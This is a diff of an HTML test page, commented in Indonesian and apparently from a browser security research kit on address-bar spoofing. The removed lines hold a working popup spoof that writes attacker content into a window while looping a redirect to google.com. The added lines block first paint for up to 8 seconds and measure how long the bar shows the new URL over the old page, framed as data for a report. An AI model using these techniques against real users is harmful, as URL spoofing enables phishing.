@@ -1,15 +1,28 @@
-<!-- 2 | address-bar spoof - popup never-commit | [1-CLICK]
-     GENOME  A=replace-loop (commit tak pernah selesai)  B=window.open('','')  C=click  D=S1  F=child document.write
-     PREDIKAT      omnibox popup menulis https://www.google.com , isinya ditulis origin penyerang
-     EXPECTED-SECURE  popup menampilkan about:blank / origin penyerang
-     KONTROL  file 3.html -->
-<button onclick="go()">Run 2</button>
-<p id=r></p>
+<!-- 2 | halaman TUJUAN untuk 1.html — memblokir paint pertamanya sendiri | [otomatis]
+     Skrip di <head> berjalan SEBELUM apa pun dilukis. Selama ia berjalan, dokumen ini
+     tidak punya satu frame pun untuk ditampilkan - jadi kompositor menahan piksel HALAMAN
+     SEBELUMNYA di layar. Sementara itu navigasi sudah COMMIT, jadi omnibox sudah menulis URL INI.
+     Blokirnya sinkron dan DIBATASI (maks 8 detik, di tab sendiri). Bukan DoS: satu tab,
+     milikmu, berhenti sendiri - ini pengukuran amplifier, bukan peledakan.
+     ANGKA YANG DICETAK di bawah = lama jendela sebenarnya, diukur dari klik sampai frame pertama. -->
 <script>
-document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
-function go() {
-  var w = window.open('', '');
-  w.document.write('<h2>SPOOFED &mdash; ditulis oleh ' + location.origin + '</h2>');
-  setInterval(function () { w.location.replace('https://www.google.com/'); }, 30);
-}
+var q = +(new URLSearchParams(location.search).get('block') || 0);
+var ms = Math.min(Math.max(q, 0), 8000);
+var t = Date.now(); while (Date.now() - t < ms);
+</script>
+<h2 style="font:20px system-ui;color:#b00">HALAMAN B — baru muncul SEKARANG</h2>
+<pre id=g style="font:12px/1.7 monospace"></pre>
+<a href="1.html">kembali ke A</a>
+<script>
+var t0 = +sessionStorage.t0 || 0;
+var gap = t0 ? Date.now() - t0 : 0;
+try { sessionStorage.gapBack = gap; } catch (e) { }   // dibaca 12.html sbg lengan kontrol
+g.textContent =
+  'REAL ORIGIN     : ' + location.href +
+  '\nblokir diminta  : ' + q + ' ms  (dibatasi ke ' + ms + ')' +
+  '\n\nJENDELA TERUKUR : ' + gap + ' ms' +
+  '\n  = selama ' + gap + ' ms, address bar menulis 2.html' +
+  '\n    sementara layar masih menampilkan 1.html' +
+  '\n\n>500 ms konsisten = jendela yang bisa dipakai -> screenshot -> lapor' +
+  '\n~0 ms = browser menahan bar sampai paint (aman)';
 </script>
